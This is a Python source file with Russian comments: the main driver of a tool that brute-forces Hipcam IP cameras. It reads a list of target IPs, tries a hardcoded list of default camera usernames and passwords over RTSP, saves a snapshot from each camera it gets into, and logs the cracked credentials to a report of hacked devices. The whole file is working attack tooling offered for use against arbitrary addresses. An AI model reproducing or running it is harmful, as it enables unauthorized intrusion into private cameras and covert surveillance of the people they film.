# hipcam_main.py
import argparse
import os
import threading
import queue
from hipcam_detect import detect_hipcam
from hipcam_brute import HipcamBruteforcer
from hipcam_snapshot import get_snapshot


# Настройки (меняй тут, если надо)
PORT = 554
THREADS_PER_IP = 2     # потоков брутфорса на каждый IP
PARALLEL_IPS = 3        # сколько IP обрабатывать одновременно
SNAPSHOT_DIR = "snapshots"
TIMEOUT = 15

# Стандартные учётные данные
CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "88888888"),
    ("admin", "tlJwpbo6"),
    ("user", "user"),
    ("user", "12345"),
    ("user", "password"),
    ("root", "root"),
    ("root", "12345"),
    ("service", "service"),
    ("guest", "guest"),
    ("guest", "12345"),
]


def load_targets(filepath):
    """Загружает IP из файла (по одному на строку, # — комментарий)."""
    targets = []
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                targets.append(line)
    return targets


def process_target(ip, results, lock):
    """Определение → брутфорс → снимок для одного IP."""
    print(f"\n[*] IP: {ip}")

    is_hipcam, _, _ = detect_hipcam(ip, ports=[PORT])
    print(f"    Hipcam: {'да' if is_hipcam else 'нет'}")

    bruteforcer = HipcamBruteforcer(
        ip=ip, port=PORT, threads=THREADS_PER_IP, timeout=TIMEOUT
    )
    result = bruteforcer.brute(CREDENTIALS)

    if result is None:
        print(f"    [-] Учётные данные не найдены")
        return

    username, password, rtsp_path = result
    print(f"    [+] ЛОГИН: {username}  ПАРОЛЬ: {password}  (путь: {rtsp_path})")

    # Снимок
    safe_ip = ip.replace(".", "_").replace(":", "_")
    snapshot_file = os.path.join(SNAPSHOT_DIR, f"{safe_ip}.jpg")
    get_snapshot(
        ip=ip,
        port=PORT,
        username=username,
        password=password,
        rtsp_path=rtsp_path,
        output_file=snapshot_file,
    )

    with lock:
        results.append({
            "ip": ip,
            "is_hipcam": is_hipcam,
            "username": username,
            "password": password,
            "rtsp_path": rtsp_path,
            "snapshot": snapshot_file,
        })


def main():
    parser = argparse.ArgumentParser(description="Hipcam bruteforce + snapshot")
    parser.add_argument("-i", "--input", required=True, help="Файл со списком IP")
    args = parser.parse_args()

    targets = load_targets(args.input)
    if not targets:
        print("[-] Файл с IP пуст")
        return

    os.makedirs(SNAPSHOT_DIR, exist_ok=True)

    print(f"[*] Загружено {len(targets)} IP")
    print(f"[*] Учётных данных: {len(CREDENTIALS)}")
    print(f"[*] Потоков на IP: {THREADS_PER_IP}, параллельных IP: {PARALLEL_IPS}")
    print(f"[*] Снимки: {SNAPSHOT_DIR}/")

    target_queue = queue.Queue()
    for ip in targets:
        target_queue.put(ip)

    results = []
    lock = threading.Lock()

    def worker():
        while True:
            try:
                ip = target_queue.get_nowait()
            except queue.Empty:
                return
            try:
                process_target(ip, results, lock)
            except Exception as e:
                print(f"[-] Ошибка на {ip}: {e}")
            finally:
                target_queue.task_done()

    threads = []
    for _ in range(min(PARALLEL_IPS, len(targets))):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    # Итог
    print(f"\n{'='*70}")
    print(f"[*] ИТОГ: {len(results)} из {len(targets)} взломано")
    print(f"{'='*70}")

    if results:
        print(f"{'IP':<18} {'Логин':<12} {'Пароль':<15} {'Снимок'}")
        print("-" * 70)
        for r in results:
            print(f"{r['ip']:<18} {r['username']:<12} {r['password']:<15} {r['snapshot']}")

        # Сохраняем отчёт
        with open("results.txt", "w", encoding="utf-8") as f:
            f.write(f"{'IP':<18} {'Логин':<12} {'Пароль':<15} {'RTSP-путь'}\n")
            f.write("-" * 70 + "\n")
            for r in results:
                f.write(f"{r['ip']:<18} {r['username']:<12} {r['password']:<15} {r['rtsp_path']}\n")
        print(f"\n[*] Отчёт сохранён: results.txt")


if __name__ == "__main__":
    main()
